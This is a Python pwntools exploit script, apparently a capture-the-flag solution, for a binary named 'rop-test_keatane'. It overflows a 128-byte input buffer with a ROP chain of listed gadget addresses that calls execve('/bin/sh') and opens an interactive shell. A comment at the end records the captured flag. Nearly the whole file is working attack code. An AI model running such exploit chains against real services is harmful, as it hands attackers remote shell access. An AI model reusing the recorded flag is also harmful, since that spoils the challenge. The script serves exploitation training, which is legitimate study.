#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./rop-test_keatane --host remotehost --port 1234
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './rop-test_keatane')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
host = args.HOST or '192.168.20.1'
port = int(args.PORT or 5280+12)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return start_remote(argv, *a, **kw)
    else:
        return start_local(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)

OFFSET_RIP = 128

io = start()

#string = cyclic(300) # user input buffer is 128 
#io.recvuntil(b': ')
#io.sendline(string)

# in the following search with ropper for get the gadgets to obtain:
# execve('/bin/sh', 0, 0)
# I need: rax = 59, rdx = 0, rsi = 0, rdi = /bin/sh

# Gadgets found
# 0x00000000004011ab: pop rax; sub rdi, rdi; ret;
# 0x00000000004011be: pop rdx; ret;
# 0x00000000004011b3: xor rsi, rsi; ret;
# 0x00000000004011b0: pop rdi; pop rbx; ret;
# 0x00000000004011c7: syscall;
# 0x00402051  /bin/sh
# 0x000000000040101a: ret; # needed for alignment
POP_RAX = 0x00000000004011ab
POP_RDX = 0x00000000004011be # no xor rdi, rdi found
XOR_RSI = 0x00000000004011b3
POP_RDI = 0x00000000004011b0
SYSCALL = 0x00000000004011c7
SHELL = 0x00402051
RET = 0x000000000040101a


io.recvuntil(b': ')
io.sendline(b'a' * OFFSET_RIP + 
        p64(RET) + 
        p64(POP_RAX) + p64(59) +
        p64(POP_RDX) + p64(0) +
        p64(XOR_RSI) +
        p64(POP_RDI) + p64(SHELL) + p64(0xbadc0ffe) + # needed because of extra 'pop rbx' in gadget
        p64(SYSCALL))

io.interactive()

# cat flag.txt
# BASC{c0d3_r3U5e_FtW___1HOqfJXM}

